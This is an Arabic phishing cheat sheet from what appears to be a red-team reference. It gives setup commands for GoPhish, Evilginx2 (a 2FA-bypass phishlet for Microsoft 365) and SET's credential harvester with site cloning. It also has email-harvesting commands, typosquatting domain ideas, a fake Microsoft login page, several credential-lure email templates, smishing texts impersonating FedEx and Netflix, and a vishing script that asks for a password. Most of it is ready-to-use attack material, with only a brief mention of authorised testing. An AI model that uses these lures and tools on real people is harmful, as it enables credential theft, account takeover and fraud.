<a id="-phishing-cheatsheet"></a>
# 🎣 ورقة مرجعية للتصيد الاحتيالي (Phishing)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Phishing.tr.md) • [🇬🇷 Ελληνικά](Phishing.el.md)

```
██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ 
██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗
██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║
██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

<a id="-phishing-types"></a>
## 📊 أنواع التصيد الاحتيالي

| النوع | الهدف | الوصف |
|------|--------|-------------|
| **التصيد (Phishing)** | جماعي | رسائل عامة لعدد كبير من المستخدمين |
| **التصيد الموجه (Spear Phishing)** | محدد | يستهدف أفرادًا بعينهم |
| **تصيد كبار المسؤولين (Whaling)** | التنفيذيون | استهداف الإدارة العليا والمديرين |
| **التصيد بالنسخ (Clone Phishing)** | أي هدف | نسخة من رسالة شرعية تتضمن محتوى خبيثًا |
| **التصيد الصوتي (Vishing)** | أي هدف | تصيد عبر الصوت أو الهاتف |
| **التصيد النصي (Smishing)** | أي هدف | تصيد عبر SMS |
| **إعادة التوجيه الاحتيالي (Pharming)** | أي هدف | التلاعب بـ DNS للتوجيه إلى موقع مزيف |

---

<a id="-gophish-setup--usage"></a>
## 🛠️ إعداد GoPhish واستخدامه

<a id="installation"></a>
### التثبيت

> **ملاحظة إصدار:** يحدد مثال GoPhish الإصدار `0.12.1` صراحة؛ أبقينا رابط التنزيل وأوامره كما في الأصل، ولا يعني ذلك أنه أحدث إصدار.
```bash
# تنزيل GoPhish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
cd gophish

# تشغيل GoPhish
./gophish

# الوصول إلى لوحة الإدارة
https://localhost:3333
# بيانات الدخول الأولية: admin / راجع مخرجات الطرفية
```

<a id="campaign-setup-flow"></a>
### تسلسل إعداد الحملة
```
1. Sending Profile   - إعداد خادم SMTP
2. Landing Page      - إنشاء صفحة دخول مزيفة
3. Email Template    - تصميم رسالة التصيد
4. Users & Groups    - استيراد قائمة الأهداف
5. Launch Campaign   - إرسال رسائل التصيد
6. Monitor Results   - تتبع الفتح والنقرات وبيانات الاعتماد
```

<a id="email-template-example"></a>
### مثال لقالب بريد إلكتروني

النص الظاهر في المثال يطلب من المستلم التحقق من بيانات اعتماد حسابه خلال 24 ساعة عبر الرابط، ويُوقّع باسم فريق الدعم التقني. أُبقي قالب HTML ومتغيراته كما في الأصل.
```html
<!DOCTYPE html>
<html>
<body>
<p>Dear {{.FirstName}},</p>
<p>Your IT department requires you to verify your account credentials.</p>
<p>Please click the link below to complete verification:</p>
<p><a href="{{.URL}}">Verify Account</a></p>
<p>This action is required within 24 hours.</p>
<br>
<p>IT Support Team</p>
</body>
</html>
```

<a id="landing-page-example"></a>
### مثال لصفحة الهبوط

يعرض المثال صفحة دخول تحمل اسم Microsoft، مع حقلي البريد وكلمة المرور وزر تسجيل الدخول. أُبقيت عناصر HTML وقيم خصائصها كما وردت في الأصل.
```html
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Login</title>
</head>
<body>
    <form method="post" action="">
        <h2>Sign in</h2>
        <input type="email" name="email" placeholder="Email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Sign in</button>
    </form>
</body>
</html>
```

---

<a id="-evilginx2-2fa-bypass"></a>
## 🔥 أداة Evilginx2 وتجاوز المصادقة الثنائية (2FA)

> **توضيح:** لا يعني عنوان القسم تجاوز جميع أشكال 2FA؛ توثق MITRE اعتراض الرموز لتجاوز أساليب MFA غير المقاومة للتصيد. تختلف النتيجة باختلاف آلية المصادقة. [مرجع MITRE ATT&CK](https://attack.mitre.org/software/S9003/).

<a id="installation-1"></a>
### التثبيت
```bash
# تثبيت Evilginx2
go install github.com/kgretzky/evilginx2@latest

# أو تنزيل الملف التنفيذي
wget https://github.com/kgretzky/evilginx2/releases/...

# التشغيل
sudo evilginx2
```

<a id="basic-setup"></a>
### الإعداد الأساسي
```bash
# داخل وحدة تحكم Evilginx2
config domain yourdomain.com
config ip YOUR_SERVER_IP

# عرض قوالب phishlets
phishlets

# تفعيل قالب phishlet الخاص بـ Microsoft 365
phishlets hostname o365 login.yourdomain.com
phishlets enable o365

# إنشاء رابط استدراج (Lure)
lures create o365
lures get-url 0
```

<a id="phishlet-targets"></a>
### الخدمات المستهدفة بقوالب Phishlet
```
o365        - Microsoft 365
google      - حسابات Google
linkedin    - LinkedIn
twitter     - Twitter/X
github      - GitHub
instagram   - Instagram
```

---

<a id="-email-harvesting"></a>
## 📧 جمع عناوين البريد الإلكتروني

<a id="theharvester"></a>
### theHarvester
```bash
# جمع عناوين البريد الإلكتروني
theHarvester -d target.com -b all

# مصادر محددة
theHarvester -d target.com -b google,linkedin,bing

# حفظ المخرجات في ملف
theHarvester -d target.com -b all -f output.html
```

<a id="hunterio"></a>
### Hunter.io
```bash
# عبر واجهة API
curl "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=YOUR_KEY"

# الحصول على صيغة عنوان البريد الإلكتروني
curl "https://api.hunter.io/v2/email-finder?domain=target.com&first_name=John&last_name=Doe&api_key=YOUR_KEY"
```

<a id="linkedin-enumeration"></a>
### استكشاف LinkedIn
```bash
# باستخدام linkedin2username
python linkedin2username.py -u USERNAME -c COMPANY_NAME

# تخمين صيغة العناوين
john.doe@company.com
jdoe@company.com
j.doe@company.com
johnd@company.com
```

---

<a id="-sending-infrastructure"></a>
## 📮 البنية التحتية للإرسال

<a id="smtp-services-for-testing"></a>
### خدمات SMTP للاختبار
```
- Amazon SES
- SendGrid
- Mailgun
- SMTP2GO
- استضافة ذاتية مع احتمال مرتفع لتصنيف الرسائل كبريد مزعج
```

<a id="spfdkimdmarc-bypass"></a>
### تجاوز آليات SPF وDKIM وDMARC
```bash
# فحص سجل SPF
dig txt target.com | grep spf

# نقاط ضعف محتملة في SPF:
# - استخدام "include:" مع أطراف خارجية ذات سياسات متساهلة
# - استخدام "~all" (إخفاق مرن softfail) بدلًا من "-all"
# - غياب سجل SPF

# فحص DMARC
dig txt _dmarc.target.com
```

<a id="domain-setup-for-phishing"></a>
### إعداد النطاق للتصيد
```bash
# نطاقات متشابهة لاستغلال أخطاء الكتابة (Typosquatting)
target.com → tarqet.com
target.com → target-secure.com
target.com → target.co
target.com → target-login.com

# التحقق من توفر النطاق
whois potential-phish-domain.com
```

---

<a id="-smishing-sms-phishing"></a>
## 📱 التصيد عبر الرسائل النصية (Smishing)

<a id="common-pretexts"></a>
### ذرائع شائعة
```
- إشعار بتسليم طرد
- تنبيه أمني من البنك
- الفوز بجائزة أو سحب
- التحقق من الحساب
- رمز مصادقة ثنائية
```

<a id="sms-sending-services"></a>
### خدمات إرسال الرسائل النصية
```
- Twilio
- Nexmo/Vonage
- Plivo
- AWS SNS
```

<a id="example-messages"></a>
### أمثلة للرسائل
```
[FedEx] طردك بانتظارك. أكد التسليم: http://short.url/abc

[BankName] رُصد نشاط غير معتاد. تحقق الآن: http://secure-link.com

[Netflix] تعذرت عملية الدفع. حدّث البيانات: http://netflix-billing.com
```

---

<a id="-vishing-voice-phishing"></a>
## 📞 التصيد الصوتي (Vishing)

<a id="common-scenarios"></a>
### سيناريوهات شائعة
```
□ دعم تقني يطلب إعادة تعيين كلمة المرور
□ قسم مكافحة الاحتيال في البنك
□ جهة حكومية مثل IRS أو مصلحة الضرائب
□ احتيال الدعم التقني
□ طلب عاجل من المدير التنفيذي أو المدير المالي
□ التحقق من المورد
```

<a id="vishing-script-example"></a>
### مثال لنص مكالمة تصيد صوتي
```
"مرحبًا، معك [Name] من مكتب الدعم التقني. رصدنا
نشاطًا غير معتاد على حسابك ونحتاج إلى التحقق من
بيانات اعتمادك لمنع خرق أمني. هل يمكنك تأكيد
اسم المستخدم وكلمة المرور الحالية حتى أتمكن من
التحقق من حسابك؟"
```

<a id="tools"></a>
### الأدوات
```bash
# انتحال هوية المتصل
- SpoofCard
- SpoofTel

# أدوات تغيير الصوت
- Voicemod
- Clownfish
```

---

<a id="-set-social-engineering-toolkit"></a>
## 🎯 حزمة أدوات الهندسة الاجتماعية SET

<a id="installation-2"></a>
### التثبيت
```bash
git clone https://github.com/trustedsec/social-engineer-toolkit
cd social-engineer-toolkit
pip install -r requirements.txt
sudo python setoolkit
```

<a id="menu-options"></a>
### خيارات القائمة
```
1) Spear-Phishing Attack Vectors
2) Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
5) Mass Mailer Attack
```

<a id="credential-harvester"></a>
### جامع بيانات الاعتماد (Credential Harvester)
```bash
# داخل SET:
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner
# أدخل عنوان URL المراد نسخه، مثل https://login.microsoft.com
# تستضيف SET الموقع المزيف وتلتقط بيانات الاعتماد
```

---

<a id="-phishing-email-templates"></a>
## 📝 قوالب رسائل التصيد

<a id="password-reset"></a>
### إعادة تعيين كلمة المرور
```
الموضوع: [إجراء مطلوب] طلب إعادة تعيين كلمة المرور

عزيزي {Name}،

تلقينا طلبًا لإعادة تعيين كلمة مرورك. إذا لم تقدم
هذا الطلب، يُرجى النقر أدناه لتأمين
حسابك فورًا.

[تأمين حسابي]

تنتهي صلاحية هذا الرابط خلال 24 ساعة.

مع التحية،
فريق الأمن
```

<a id="it-support"></a>
### الدعم التقني
```
الموضوع: صيانة مجدولة للنظام - إجراء مطلوب

عزيزي {Name}،

سيجري فريق تقنية المعلومات صيانة مجدولة. لضمان
استمرار وصولك دون انقطاع، يُرجى التحقق من بيانات اعتمادك:

[التحقق الآن]

قد يؤدي عدم التحقق إلى قفل الحساب.

قسم تقنية المعلومات
```

<a id="package-delivery"></a>
### تسليم الطرود
```
الموضوع: تعذر تسليم طردك

تعذر تسليم طردك من Amazon. يُرجى
تأكيد عنوان التسليم:

[تأكيد التسليم]

رقم التتبع: {Random}

شكرًا لك،
فريق التوصيل
```

---

<a id="-phishing-campaign-checklist"></a>
## 📋 قائمة تحقق لحملة التصيد

```markdown
قبل الحملة:
□ تحديد النطاق والأهداف ضمن اختبار مصرح به
□ جمع عناوين البريد الإلكتروني المستهدفة
□ تسجيل نطاق مشابه
□ إعداد البنية التحتية لـ SMTP
□ إعداد SPF وDKIM إن أمكن
□ إنشاء صفحة الهبوط
□ إنشاء قالب البريد الإلكتروني

تنفيذ الحملة:
□ اختبار وصول الرسائل ومرشحات البريد المزعج
□ استيراد قائمة الأهداف
□ جدولة الحملة
□ مراقبة معدلات وصول الرسائل
□ تتبع فتح الرسائل والنقرات وإرسال النماذج

بعد الحملة:
□ إنشاء التقارير
□ تحليل معدلات النقر
□ مراجعة البيانات الملتقطة
□ تحديد الاحتياجات التدريبية
□ توثيق النتائج
```

---

<a id="-related-cheatsheets"></a>
## 🔗 أوراق مرجعية ذات صلة

- [اختلاق الذرائع (Pretexting)](./Pretexting.ar.md)
- [استخبارات المصادر المفتوحة: البحث المتقدم في Google](../../Google-Dorking/README.md)

---

**العودة إلى النظرة العامة:** [🎭 الهندسة الاجتماعية](./README.ar.md)
